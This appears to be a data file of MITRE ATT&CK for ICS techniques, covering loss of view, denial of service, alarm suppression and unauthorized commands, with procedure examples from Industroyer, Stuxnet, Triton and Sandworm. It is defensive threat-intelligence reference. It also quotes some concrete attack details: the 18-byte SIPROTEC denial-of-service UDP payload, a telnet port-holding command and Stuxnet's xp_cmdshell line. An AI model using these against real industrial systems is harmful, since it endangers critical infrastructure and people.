T0829,Loss of View,"Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation. By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations. This loss of view can occur without affecting the physical processes themselves.   ","['[KillDisk] erases the master boot record (MBR) and system logs, leaving the system unusable. ', ""Some of Norsk Hydro's production systems were impacted by a [LockerGoga] infection. This resulted in a loss of view which forced the company to switch to manual operations.  "", '[Industroyer] data wiper component removes the registry image path throughout the system and overwrites all files, rendering the system unusable. ']",
T0800,Activate Firmware Update Mode,"Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction. For example, devices such as protection relays may have an operation mode designed for firmware installation. This mode may halt process monitoring and related functions to allow new firmware to be loaded. A device left in update mode may be placed in an inactive holding state if no firmware is provided to it. By entering and leaving a device in this mode, the adversary may deny its usual functionalities.","['The [Industroyer] SIPROTEC DoS module places the victim device into firmware update mode. This is a legitimate use case under normal circumstances, but in this case is used the adversary to prevent the SIPROTEC from performing its designed protective functions. As a result the normal safeguards are disabled, leaving an unprotected link in the electric transmission. ']",
T0831,Manipulation of Control,"Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.     Methods of Manipulation of Control include:   * Man-in-the-middle   * Spoof command message  * Changing setpoints    A Polish student used a remote controller device to interface with the Lodz city tram system in Poland.    Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops.  The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. ","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] opened live breakers via remote commands to the HMI, causing blackouts. ', '[Industroyer] toggles breakers to the open state utilizing unauthorized command messages. ', '[Stuxnet] can reprogram a PLC and change critical parameters in such a way that legitimate commands can be overridden or intercepted. In addition, Stuxnet can apply inappropriate command sequences or parameters to cause damage to property. ', 'During the [Oldsmar Treatment Plant Intrusion] the threat actors utilized an operator HMI to manipulate process control setpoint values far beyond normal operating levels.']",False
T0814,Denial of Service,"Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment.   Some ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware.    Adversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a denial of service condition.   Adversaries may have prior knowledge about industrial protocols or control devices used in the environment through [Remote System Information Discovery] There are examples of adversaries remotely causing a [Device Restart/Shutdown] by exploiting a vulnerability that induces uncontrolled resource consumption.    ","['The [Industroyer] SIPROTEC DoS module exploits the CVE-2015-5374 vulnerability in order to render a Siemens SIPROTEC device unresponsive. Once this vulnerability is successfully exploited, the target device stops responding to any commands until it is rebooted manually.  Once the tool is executed it sends specifically crafted packets to port 50,000 of the target IP addresses using UDP. The UDP packet contains the following 18 byte payload: 0x11 49 00 00 00 00 00 00 00 00 00 00 00 00 00 00 28 9E. ', 'The execution on the PLC can be stopped by violating the cycle time limit. The [PLC-Blaster] implements an endless loop triggering an error condition within the PLC with the impact of a DoS. ', 'During the [2015 Ukraine Electric Power Attack] power company phone line operators were hit with a denial of service attack so that they couldn’t field customers’ calls about outages. Operators were also denied service to their downstream devices when their serial-to-ethernet converters had their firmware overwritten, which bricked the devices. ', 'The [Backdoor.Oldrea] payload has caused multiple common OPC platforms to intermittently crash. This could cause a denial of service effect on applications reliant on OPC communications. ']",False
T0805,Block Serial COM,"Adversaries may block access to serial COM to prevent instructions or configurations from reaching target devices. Serial Communication ports (COM) allow communication with control system devices. Devices can receive command and configuration messages over such serial COM. Devices also use serial COM to send command and reporting messages. Blocking device serial COM may also block command messages and block reporting messages.   A serial to Ethernet converter is often connected to a serial COM to facilitate communication between serial and Ethernet devices. One approach to blocking a serial COM would be to create and hold open a TCP session with the Ethernet side of the converter. A serial to Ethernet converter may have a few ports open to facilitate multiple communications. For example, if there are three serial COM available -- 1, 2 and 3 --, the converter might be listening on the corresponding ports 20001, 20002, and 20003. If a TCP/IP connection is opened with one of these ports and held open, then the port will be unavailable for use by another party. One way the adversary could achieve this would be to initiate a TCP session with the serial to Ethernet converter at 10.0.0.1 via Telnet on serial port 1 with the following command: telnet 10.0.0.1 20001.","['During the [2015 Ukraine Electric Power Attack] [Sandworm Team] overwrote the serial-to-ethernet converter firmware, rendering the devices not operational. This meant that communication to the downstream serial devices was either not possible or more difficult. ', 'In [Industroyer] the first COM port from the configuration file is used for the actual communication and the two other COM ports are just opened to prevent other processes accessing them. Thus, the IEC 101 payload component is able to take over and maintain control of the RTU device. ']",False
T0850,Role Identification,"Adversaries may perform role identification of devices involved with physical processes of interest in a target control system. Control systems devices often work in concert to control a physical process. Each device can have one or more roles that it performs within that control process. By collecting this role-based data, an adversary can construct a more targeted attack.  For example, a power generation plant may have unique devices such as one that monitors power output of a generator and another that controls the speed of a turbine. Examining devices roles allows the adversary to observe how the two devices work together to monitor and control a physical process. Understanding the role of a target device can inform the adversary's decision on what action to take, in order to cause Impact and influence or disrupt the integrity of operations. Furthermore, an adversary may be able to capture control system protocol traffic. By studying this traffic, the adversary may be able to determine which devices are outstations, and which are masters. Understanding of master devices and their role within control processes can enable the use of Rogue Master Device","['The [Backdoor.Oldrea] payload has the capability of enumerating OPC tags, in addition to more generic OPC server information. The server data and tag names can provide information about the names and function of control devices.)', 'The [Industroyer] IEC 61850 component enumerates the objects discovered in the previous step and sends the domain-specific getNameList requests with each object name. This enumerates named variables in a specific domain.']",
T0807,Command-Line Interface,"Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments.  Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.  CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.  Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context. Many controllers have CLI interfaces for management purposes.","['[Sandworm Team] uses the MS-SQL server xp_cmdshell command, and PowerShell to execute commands. ', 'The name of the [Industroyer] payload DLL is supplied by the attackers via a command line parameter supplied in one of the main backdoors execute a shell command commands. ', '[Stuxnet] will store and execute SQL code that will extract and execute Stuxnet from the saved CAB file using xp_cmdshell with the following command: `set @s = master..xp _ cmdshell extrac32 /y +@t+ +@t+x; exec(@s);` ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] supplied the name of the payload DLL to [Industroyer] via a command line parameter.']",False
T0861,Point & Tag Identification,"Adversaries may collect point and tag values to gain a more comprehensive understanding of the process environment. Points may be values such as inputs, memory locations, outputs or other process specific variables.  Tags are the identifiers given to points for operator convenience.   Collecting such tags provides valuable context to environmental points and enables an adversary to map inputs, outputs, and other values to their control processes. Understanding the points being collected may inform an adversary on which processes and values to keep track of over the course of an operation.","['[INCONTROLLER] can remotely read the OCP UA structure from devices. ', 'The [Backdoor.Oldrea] payload has the capability of enumerating OPC tags, in addition to more generic OPC server information. The server data and tag names can provide information about the names and function of control devices.  ', '[Backdoor.Oldrea] enumerates all OPC tags and queries for specific fields such as server state, tag name, type, access, and id.']",False
T0816,Device Restart/Shutdown,"Adversaries may forcibly restart or shutdown a device in an ICS environment to disrupt and potentially negatively impact physical processes. Methods of device restart and shutdown exist in some devices as built-in, standard functionalities. These functionalities can be executed using interactive device web interfaces, CLIs, and network protocol commands.  Unexpected restart or shutdown of control system devices may prevent expected response functions happening during critical states.  A device restart can also be a sign of malicious device modifications, as many updates require a shutdown in order to take effect.","['The [Industroyer] SIPROTEC DoS module exploits the CVE-2015-5374 vulnerability in order to render a Siemens SIPROTEC device unresponsive. While the vulnerability does not directly cause the restart or shutdown of the device, the device must be restarted manually before it can resume operations. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. ', 'In the 2015 attack on the Ukrainian power grid, the [Sandworm Team] scheduled disconnects of uninterruptable power supply (UPS) systems so that when power was disconnected from the substations, the devices would shut down and service could not be recovered. ']",False
T0863,User Execution,"Adversaries may rely on a targeted organizations user interaction for the execution of malicious code. User interaction may consist of installing applications, opening email attachments, or granting higher permissions to documents.   Adversaries may embed malicious code or visual basic code into files such as Microsoft Word and Excel documents or software installers.  Execution of this code requires that the user enable scripting or write access within the document. Embedded code may not always be noticeable to the user especially in cases of trojanized software.    A Chinese spearphishing campaign running from December 9, 2011 through February 29, 2012 delivered malware through spearphishing attachments which required user action to achieve execution. ","['[REvil] initially executes when the user clicks on a JavaScript file included in the phishing emails .zip attachment. ', 'Execution of [Backdoor.Oldrea] relies on a user opening a trojanized installer attached to an email.  ', ""[Stuxnet] infects DLL's associated with the WinCC Simatic manager which are responsible for opening project files. If a user opens an uninfected project file using a compromised manager, the file will be infected with Stuxnet code. If an infected project is opened with the Simatic manager, the modified data file will trigger a search for the `xyz.dll` file. If the `xyz.dll` file is not found in any of the specified locations, the malicious DLL will be loaded and executed by the manager. "", '[Bad Rabbit] is disguised as an Adobe Flash installer. When the file is opened it starts locking the infected computer. ']",False
T0860,Wireless Compromise,"Adversaries may perform wireless compromise as a method of gaining communications and unauthorized access to a wireless network. Access to a wireless network may be gained through the compromise of a wireless device.   Adversaries may also utilize radios and other wireless communication devices on the same frequency as the wireless network. Wireless compromise can be done as an initial access vector from a remote distance.   A Polish student used a modified TV remote controller to gain access to and control over the Lodz city tram system in Poland.   The remote controller device allowed the student to interface with the trams network to modify track settings and override operator control. The adversary may have accomplished this by aligning the controller to the frequency and amplitude of IR control protocol signals.  The controller then enabled initial access to the network, allowing the capture and replay of tram signals. ","[""In the [Maroochy Water Breach] the adversary used a two-way radio to communicate with and set the frequencies of Maroochy Shire's repeater stations.""]",False
T0858,Change Operating Mode,"Adversaries may change the operating mode of a controller to gain additional access to engineering functions such as Program Download.   Programmable controllers typically have several modes of operation that control the state of the user program and control access to the controllers API. Operating modes can be physically selected using a key switch on the face of the controller but may also be selected with calls to the controllers API. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:    * Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off.    * Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic. [Program Upload] and [Program Download] are disabled while in this mode.         * Remote - Allows for remote changes to a PLCs operation mode.      * Stop - The PLC and program is stopped, while in this mode, outputs are forced off.     * Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers.     * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. ","['[INCONTROLLER] can establish a remote HTTP connection to change the operating mode of Omron PLCs. ', '[Triton] has the ability to halt or run a program through the TriStation protocol. TsHi.py contains instances of halt and run functions being executed. ', '[PLC-Blaster] stops the execution of the user program on the target to enable the transfer of its own code. The worm then copies itself to the target and subsequently starts the target PLC again. ']",False
T0878,Alarm Suppression,"Adversaries may target protection function alarms to prevent them from notifying operators of critical conditions. Alarm messages may be a part of an overall reporting system and of particular interest for adversaries. Disruption of the alarm system does not imply the disruption of the reporting system as a whole.  A Secura presentation on targeting OT notes a dual fold goal for adversaries attempting alarm suppression: prevent outgoing alarms from being raised and prevent incoming alarms from being responded to.  The method of suppression may greatly depend on the type of alarm in question:    * An alarm raised by a protocol message  * An alarm signaled with I/O  * An alarm bit set in a flag (and read)   In ICS environments, the adversary may have to suppress or contend with multiple alarms and/or alarm propagation to achieve a specific goal to evade detection or prevent intended responses from occurring.   Methods of suppression may involve tampering or altering device displays and logs, modifying in memory code to fixed values, or even tampering with assembly level instruction code.",['In the [Maroochy Water Breach] the adversary suppressed alarm reporting to the central computer.'],False
T0868,Detect Operating Mode,"Adversaries may gather information about a PLCs or controllers current operating mode. Operating modes dictate what change or maintenance functions can be manipulated and are often controlled by a key switch on the PLC (e.g.,  run, prog [program], and remote). Knowledge of these states may be valuable to an adversary to determine if they are able to reprogram the PLC. Operating modes and the mechanisms by which they are selected often vary by vendor and product line. Some commonly implemented operating modes are described below:    * Program - This mode must be enabled before changes can be made to a devices program. This allows program uploads and downloads between the device and an engineering workstation. Often the PLCs logic Is halted, and all outputs may be forced off.    * Run - Execution of the devices program occurs in this mode. Input and output (values, points, tags, elements, etc.) are monitored and used according to the programs logic.[Program Upload] and [Program Download] are disabled while in this mode.         * Remote - Allows for remote changes to a PLCs operation mode.      * Stop - The PLC and program is stopped, while in this mode, outputs are forced off.     * Reset - Conditions on the PLC are reset to their original states. Warm resets may retain some memory while cold resets will reset all I/O and data registers.     * Test / Monitor mode - Similar to run mode, I/O is processed, although this mode allows for monitoring, force set, resets, and more generally tuning or debugging of the system. Often monitor mode may be used as a trial for initialization. ",['[Triton] contains a file named TS_cnames.py which contains default definitions for program state (TS_progstate). Program state is referenced in TsHi.py.  [Triton] contains a file named TS_cnames.py which contains default definitions for key state (TS_keystate). Key state is referenced in TsHi.py.'],False
T0837,Loss of Protection,"Adversaries may compromise protective system functions designed to prevent the effects of faults and abnormal conditions. This can result in equipment damage, prolonged process disruptions and hazards to personnel.   Many faults and abnormal conditions in process control happen too quickly for a human operator to react to. Speed is critical in correcting these conditions to limit serious impacts such as Loss of Control and Property Damage.   Adversaries may target and disable protective system functions as a prerequisite to subsequent attack execution or to allow for future faults and abnormal conditions to go unchecked. Detection of a Loss of Protection by operators can result in the shutdown of a process due to strict policies regarding protection systems. This can cause a Loss of Productivity and Revenue and may meet the technical goals of adversaries seeking to cause process disruptions.",['[Industroyer] contained a module which leveraged a vulnerability in the Siemens SIPROTEC relays (CVE-2015-5374) to create a Denial of Service against automated protective relays. '],False
T0801,Monitor Process State,"Adversaries may gather information about the physical process state. This information may be used to gain more information about the process itself or used as a trigger for malicious actions. The sources of process state information may vary such as, OPC tags, historian data, specific PLC block information, or network traffic.","['[Stuxnet] examines fields recorded by the DP_RECV monitor to determine if the target system is in a particular state of operation. ', '[Industroyer2] uses a General Interrogation command to monitor the device’s Information Object Addresses (IOAs) and their IO state values.', '[Industroyer] OPC and IEC 61850 protocol modules include the ability to send stVal requests to read the status of operational variables. ']",
T0853,Scripting,"Adversaries may use scripting languages to execute arbitrary code in the form of a pre-written script or in the form of user-supplied code to an interpreter. Scripting languages are programming languages that differ from compiled languages, in that scripting languages use an interpreter, instead of a compiler. These interpreters read and compile part of the source code just before it is executed, as opposed to compilers, which compile each and every line of code to an executable file. Scripting allows software developers to run their code on any system where the interpreter exists. This way, they can distribute one package, instead of precompiling executables for many different systems. Scripting languages, such as Python, have their interpreters shipped as a default with many Linux distributions.   In addition to being a useful tool for developers and administrators, scripting language interpreters may be abused by the adversary to execute code in the target environment. Due to the nature of scripting languages, this allows for weaponized code to be deployed to a target easily, and leaves open the possibility of on-the-fly scripting to perform a task.","['[Triton] communicates with Triconex controllers using a custom component framework written entirely in Python. The modules that implement the TriStation communication protocol and other supporting components are found in a separate file -- library.zip -- the main script that employs this functionality is compiled into a standalone py2exe Windows executable -- trilog.exe  which includes a Python environment. ', '[APT33] utilized PowerShell scripts to establish command and control and install files for execution.  ', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.', '[OilRig] has embedded a macro within spearphishing attachments that has been made up of both a VBScript and a PowerShell script.', '[REvil] utilizes JavaScript, WScript, and PowerShell scripts to execute. The malicious JavaScript attachment has an obfuscated PowerShell script that executes the malware. ', '[Dragonfly 2.0] deleted indicators on staging and target devices by uninstalling software, removing event logs, batch scripts, screenshots, registry keys, documents, and tools they brought into the target networks. ', '[Sandworm Team] utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution. ', '[HEXANE] utilizes VBA macros and Powershell scripts such as DanDrop and kl.ps1 tools.  ', 'In the version of [Triton] available at the time of publication, the component that programs the Triconex controllers is written entirely in Python. The modules that implement the communciation protocol and other supporting components are found in a separate file -- library.zip -- which the main script that employs this functionality is compiled into a standalone Windows executable -- trilog.exe -- that includes a Python environment.']",False
T0888,Remote System Information Discovery,"An adversary may attempt to get detailed information about remote systems and their peripherals, such as make/model, role, and configuration. Adversaries may use information from Remote System Information Discovery to aid in targeting and shaping follow-on behaviors. For example, the system's operational role and model information can dictate whether it is a relevant target for the adversary's operational objectives. In addition, the system's configuration may be used to scope subsequent technique usage.   Requests for system information are typically implemented using automation and management protocols and are often automatically requested by vendor software during normal operation. This information may be used to tailor management actions, such as program download and system or module firmware. An adversary may leverage this same information by issuing calls directly to the system's API.","['The [Backdoor.Oldrea] payload gathers server information that includes CLSID, server name, Program ID, OPC version, vendor information, running state, group count, and server bandwidth. This information helps indicate the role the server has in the control process.  ', '[Stuxnet] enumerates and parses the System Data Blocks (SDB) using the s7blk_findfirst and s7blk_findnext API calls in s7otbxdx.dll. Stuxnet must find an SDB with the DWORD at offset 50h equal to 0100CB2Ch. This specifies that the system uses the Profibus communications processor module CP 342-5. In addition, specific values are searched for and counted: 7050h and 9500h. 7050h is assigned to part number KFC750V3 which appears to be a frequency converter drive (also known as variable frequency drive) manufactured by Fararo Paya in Teheran, Iran. 9500h is assigned to Vacon NX frequency converter drives manufactured by Vacon based in Finland.  [Stuxnet] was specifically targeting CPUs 6ES7-315-2 (Series 300) with special system data block characteristics for sequence A or B and 6ES7-315-2 for sequence C. The PLC type can also be checked using the s7ag_read_szl API.', 'The [Industroyer] IEC 61850 component sends the domain-specific MMSgetNameList request to determine what logical nodes the device supports. It then searches the logical nodes for the CSW value, which indicates the device performs a circuit breaker or switch control function.  [Industroyer] OPC DA module also uses IOPCBrowseServerAddressSpace to look for items with the following strings: ctlSelOn, ctlOperOn, ctlSelOff, ctlOperOff, Pos and stVal.  [Industroyer] IEC 60870-5-104 module includes a range mode to discover Information Object Addresses (IOAs) by enumerating through each.', '[Industroyer2] has the capability to poll a target device about its connection status, data transfer status, Common Address (CA), Information Object Addresses (IOAs), and IO state values across multiple priority levels.', '[INCONTROLLER] includes a library that creates Modbus connections with a device to request its device ID. ', 'The [Industroyer] 61850 componentsends the domain-specific MMSgetNameListrequest to determine what logical nodes the device supports. It then searches the logical nodes for the CSW value, which indicates the device performs a circuit breaker or switch control function.  ', '[Industroyer] OPC DA module also uses IOPCBrowseServerAddressSpace to look for items with the following strings: \\ctlSelOn\\, \\ctlOperOn\\, \\ctlSelOff\\, \\ctlOperOff\\, \\\\\\Pos and stVal\\. ', '[Industroyer] IEC 60870-5-104 module includes a range mode to discover Information Object Addresses (IOAs) by enumerating through each. ', 'The [Industroyer] IEC 61850 component\u202fsends the domain-specific MMS\u202fgetNameList\u202frequest to determine what logical nodes the device supports. It then searches the logical nodes for the “CSW” value, which indicates the device performs a circuit breaker or switch control function.', '[Stuxnet] enumerates and parses the System Data Blocks (SDB) using the s7blk_findfirst and s7blk_findnext API calls in s7otbxdx.dll. Stuxnet must find an SDB with the DWORD at offset 50h equal to 0100CB2Ch. This specifies that the system uses the Profibus communications processor module CP 342-5. In addition, specific values are searched for and counted: 7050h and 9500h. 7050h is assigned to part number KFC750V3 which appears to be a frequency converter drive (also known as variable frequency drive) manufactured by Fararo Paya in Teheran, Iran. 9500h is assigned to Vacon NX frequency converter drives manufactured by Vacon based in Finland.', ""[Industroyer] s OPC DA module also uses IOPCBrowseServerAddressSpace to look for items with the following strings: 'ctlSelOn', 'ctlOperOn', 'ctlSelOff', 'ctlOperOff', 'Pos and stVal'.""]",False
T0845,Program Upload,"Adversaries may attempt to upload a program from a PLC to gather information about an industrial process. Uploading a program may allow them to acquire and study the underlying logic. Methods of program upload include vendor software, which enables the user to upload and read a program running on a PLC. This software can be used to upload the target program to a workstation, jump box, or an interfacing device.","['[Triton] calls the SafeAppendProgramMod to transfer its payloads to the Tricon. Part of this call includes preforming a program upload. ', '[INCONTROLLER]  can use the CODESYS protocol to upload programs from Schneider PLCs.   [INCONTROLLER]  can obtain existing program logic from Omron PLCs by using either the program upload or backup functions available through the HTTP server. ', '[Stuxnet] replaces the DLL responsible for reading projects from a PLC to the step7 software. This allows Stuxnet the ability to upload a program from the PLC.']",
T0819,Exploit Public-Facing Application,"Adversaries may leverage weaknesses to exploit internet-facing software for initial access into an industrial network. Internet-facing software may be user applications, underlying networking implementations, an assets operating system, weak defenses, etc. Targets of this technique may be intentionally exposed for the purpose of remote management and visibility.  An adversary may seek to target public-facing applications as they may provide direct access into an ICS environment or the ability to move into the ICS network. Publicly exposed applications may be found through online tools that scan the internet for open ports and services. Version numbers for the exposed application may provide adversaries an ability to target specific known vulnerabilities. Exposed control protocol or remote access ports found in Commonly Used Port may be of interest by adversaries.","[""[Sandworm Team] actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet.  ""]",False
T0811,Data from Information Repositories,"Adversaries may target and collect data from information repositories. This can include sensitive data such as specifications, schematics, or diagrams of control system layouts, devices, and processes. Examples of information repositories include reference databases in the process environment, as well as databases in the corporate network that might contain information about the ICS.  Information collected from these systems may provide the adversary with a better understanding of the operational environment, vendors used, processes, or procedures of the ICS.  In a campaign between 2011 and 2013 against ONG organizations, Chinese state-sponsored actors searched document repositories for specific information such as, system manuals, remote terminal unit (RTU) sites, personnel lists, documents that included the string SCAD*, user credentials, and remote dial-up access information. ","['[Duqu] downloads additional modules for the collection of data in information repositories, including the Infostealer 2 module that can access data from Windows Shares.', '[Flame] has built-in modules to gather information from compromised computers. ', '[Dragonfly 2.0] accessed workstations and servers within the corporate network that contained data from power generation control system environments. The files were related to the ICS and SCADA systems including vendor names and ICS reference documents such as wiring diagrams and panel layouts. ', '[ACAD/Medre.A] collects information related to the AutoCAD application. The worm collects AutoCAD (*.dwg) files with drawings from information repositories.  ']",False
T0864,Transient Cyber Asset,"Adversaries may target devices that are transient across ICS networks and external networks. Normally, transient assets are brought into an environment by authorized personnel and do not remain in that environment on a permanent basis.  Transient assets are commonly needed to support management functions and may be more common in systems where a remotely managed asset is not feasible, external connections for remote access do not exist, or 3rd party contractor/vendor access is required.   Adversaries may take advantage of transient assets in different ways. For instance, adversaries may target a transient asset when it is connected to an external network and then leverage its trusted access in another environment to launch an attack. They may also take advantage of installed applications and libraries that are used by legitimate end-users to interact with control system devices.   Transient assets, in some cases, may not be deployed with a secure configuration leading to weaknesses that could allow an adversary to propagate malicious executable code, e.g., the transient asset may be infected by malware and when connected to an ICS environment the malware propagates onto other systems. ","['In the [Maroochy Water Breach] the adversary utilized a computer, possibly stolen, with proprietary engineering software to communicate with a wastewater system.']",False
T0835,Manipulate I/O Image,"Adversaries may manipulate the I/O image of PLCs through various means to prevent them from functioning as expected. Methods of I/O image manipulation may include overriding the I/O table via direct memory manipulation or using the override function used for testing PLC programs.  During the scan cycle, a PLC reads the status of all inputs and stores them in an image table.  The image table is the PLCs internal storage location where values of inputs/outputs for one scan are stored while it executes the user program. After the PLC has solved the entire logic program, it updates the output image table. The contents of this output image table are written to the corresponding output points in I/O Modules.   One of the unique characteristics of PLCs is their ability to override the status of a physical discrete input or to override the logic driving a physical output coil and force the output to a desired status.","['[PLC-Blaster] may manipulate any outputs of the PLC. Using the POU POKE any value within the process image may be modified. ', 'When the peripheral output is written to, sequence C intercepts the output and ensures it is not written to the process image output. The output is the instructions the PLC sends to a device to change its operating behavior. By intercepting the peripheral output, [Stuxnet] prevents an operator from noticing unauthorized commands sent to the peripheral. ']",False
T0842,Network Sniffing,"Network sniffing is the practice of using a network interface on a computer system to monitor or capture information  regardless of whether it is the specified destination for the information.   An adversary may attempt to sniff the traffic to gain information about the target. This information can vary in the level of importance. Relatively unimportant information is general communications to and from machines.  Relatively important information would be login information. User credentials may be sent over an unencrypted protocol, such as Telnet, that can be captured and obtained through network packet analysis.   In addition, ARP and Domain Name Service (DNS) poisoning can be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.","['The [VPNFilter] packet sniffer looks for basic authentication as well as monitors ICS traffic, and is specific to the TP-LINK R600-VPN. The malware uses a raw socket to look for connections to a pre-specified IP address, only looking at TCP packets that are 150 bytes or larger. Packets that are not on port 502, are scanned for BasicAuth, and that information is logged. This may have allowed credential harvesting from communications between devices accessing a modbus-enabled HMI.  ', '[INCONTROLLER] can deploy Tcpdump to sniff network traffic and collect PCAP files. ', 'DP_RECV is the name of a standard function block used by network coprocessors. It is used to receive network frames on the Profibus  a standard industrial network bus used for distributed I/O. The original block is copied to FC1869, and then replaced by a malicious block. Each time the function is used to receive a packet, the malicious [Stuxnet] block takes control: it will call the original DP_RECV in FC1869 and then perform postprocessing on the packet data. The replaced DP_RECV block (later on referred to as the DP_RECV monitor) is meant to monitor data sent by the frequency converter drives to the 315-2 CPU via CP 342-5 Profibus communication modules. ']",False
T0851,Rootkit,"Adversaries may deploy rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting and modifying operating-system API calls that supply system information. Rootkits or rootkit-enabling functionality may reside at the user or kernel level in the operating system, or lower.      Firmware rootkits that affect the operating system yield nearly full control of the system. While firmware rootkits are normally developed for the main processing board, they can also be developed for the I/O that is attached to an asset. Compromise of this firmware allows the modification of all of the process variables and functions the module engages in. This may result in commands being disregarded and false information being fed to the main device. By tampering with device processes, an adversary may inhibit its expected response functions and possibly enable [Impact]","['One of [Stuxnet] rootkits is contained entirely in the fake s7otbxdx.dll. In order to continue existing undetected on the PLC it needs to account for at least the following situations: read requests for its own malicious code blocks, read requests for infected blocks (OB1, OB35, DP_RECV), and write requests that could overwrite Stuxnets own code. Stuxnet contains code to monitor and intercept these types of requests. The rootkit modifies these requests so that Stuxnets PLC code is not discovered or damaged. ', ""One of [Stuxnet] 's rootkits is contained entirely in the fake s7otbxdx.dll. In order to continue existing undetected on the PLC it needs to account for at least the following situations: read requests for its own malicious code blocks, read requests for infected blocks (OB1, OB35, DP_RECV), and write requests that could overwrite Stuxnet’s own code. Stuxnet contains code to monitor and intercept these types of requests. The rootkit modifies these requests so that Stuxnet’s PLC code is not discovered or damaged.""]",False
T0802,Automated Collection,"Adversaries may automate collection of industrial environment information using tools or scripts. This automated collection may leverage native control protocols and tools available in the control systems environment. For example, the OPC protocol may be used to enumerate and gather information. Access to a system or interface with these native protocols may allow collection and enumeration of other attached, communicating servers and devices.","['[Industroyer2] leverages a hardcoded list of remote-station IP addresses to iteratively initiate communications and collect information across multiple priority IEC-104 priority levels.', 'Using OPC, a component of [Backdoor.Oldrea] gathers any details about connected devices and sends them back to the C2 for the attackers to analyze. ', '[Industroyer] automatically collects protocol object data to learn about control devices in the environment. ']",
T0804,Block Reporting Message,"Adversaries may block or prevent a reporting message from reaching its intended target. In control systems, reporting messages contain telemetry data (e.g., I/O values) pertaining to the current state of equipment and the industrial process. By blocking these reporting messages, an adversary can potentially hide their actions from an operator.  Blocking reporting messages in control systems that manage physical processes may contribute to system impact, causing inhibition of a response function. A control system may not be able to respond in a proper or timely manner to an event, such as a dangerous fault, if its corresponding reporting message is blocked.   ","['[Industroyer] uses the first COM port from the configuration file for the communication and the other two COM ports are opened to prevent other processes accessing them. This may block processes or operators from getting reporting messages from a device. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable. ', 'In the Ukraine 2015 Incident, [Sandworm Team] blocked reporting messages by using malicious firmware to render communication devices inoperable. ']",False
T0855,Unauthorized Command Message,"Adversaries may send unauthorized command messages to instruct control system assets to perform actions outside of their intended functionality, or without the logical preconditions to trigger their expected function. Command messages are used in ICS networks to give direct instructions to control systems devices. If an adversary can send an unauthorized command message to a control system, then it can instruct the control systems device to perform an action outside the normal bounds of the device's actions. An adversary could potentially instruct a control systems device to perform an action that will cause an [Impact]   In the Dallas Siren incident, adversaries were able to send command messages to activate tornado alarm systems across the city without an impending tornado or other disaster.  ","['[INCONTROLLER] can send custom Modbus commands to write register values on Schneider PLCs.   [INCONTROLLER] can send write tag values on OPC UA servers. ', '[Industroyer2] is capable of sending command messages from the compromised device to target remote stations to open data channels, retrieve the location and values of Information Object Addresses (IOAs), and modify the IO state values through Select Before Operate I/O, Select/Execute, and Invert Default State operations.', 'Using its protocol payloads, [Industroyer] sends unauthorized commands to RTUs to change the state of equipment. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. ', 'In the [Maroochy Water Breach] the adversary used a dedicated analog two-way radio system to send false data and instructions to pumping stations and the central computer.', 'In the Ukraine 2015 Incident, [Sandworm Team] issued unauthorized commands to substation breakers after gaining control of operator workstations and accessing a distribution management system (DMS) client application. ', 'Using [Triton] an adversary can manipulate the process into an unsafe state from the DCS while preventing the SIS from functioning appropriately.']",False
